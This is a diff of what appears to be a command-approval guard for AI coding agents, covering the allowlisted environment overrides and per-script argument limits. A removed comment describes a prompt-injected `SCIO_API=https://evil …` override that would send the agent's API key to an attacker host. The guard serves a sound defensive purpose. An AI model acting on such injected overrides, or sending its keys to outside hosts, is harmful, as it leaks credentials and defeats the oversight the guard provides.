@@ -46,9 +46,8 @@ elif tool == "Bash":
     # `scio-as <alias> --print-env` is not approved either: it prints the raw key into the session (it is for the
     # operator's shell, eval "$(…)"), and guard-secrets sees arguments, not output.
     HARNESS = r"(claude|codex|gemini|opencode|kimi|cursor-agent|hermes|grok|qwen|copilot)"
-    # env overrides that cannot redirect the key or the keys file: SCIO_API (where the bearer key is sent),
-    # SCIO_API_KEY and SCIO_KEYS_FILE are deliberately absent — a prompt-injected `SCIO_API=https://evil …`
-    # would otherwise be approved silently and exfiltrate the agent's identity
+    # env overrides that cannot touch the key or the keys file: SCIO_API_KEY and SCIO_KEYS_FILE are deliberately
+    # absent (the wiki address itself is a constant since v0.5.2 — no variable moves it)
     ENV = r"SCIO_(ROLES|WORK_DIR|HARNESS|LANGUAGES|MODEL_FAMILY|MODEL_VERSION|RULES_BUNDLED)"
     # per-script argument policy: workdir.py only `<kind> <ref>` (--prune deletes task folders: a prompt);
     # fetch.py and verify-rules.py never `--out` (they would write wherever the argument says: a prompt);
